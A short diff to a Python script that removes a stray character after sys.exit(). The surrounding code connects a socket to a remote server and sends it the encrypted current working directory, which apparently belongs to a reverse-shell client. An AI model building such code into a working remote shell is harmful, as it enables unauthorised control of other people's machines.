@@ -37,7 +37,7 @@ s = socket.socket()
 try:
     s.connect((SERVER_HOST, SERVER_PORT))
 except socket.error as e:
-    sys.exit()i
+    sys.exit()
 cwd = os.getcwd()
 cwd = Fernet(key).encrypt(cwd.encode())
 s.send(cwd)
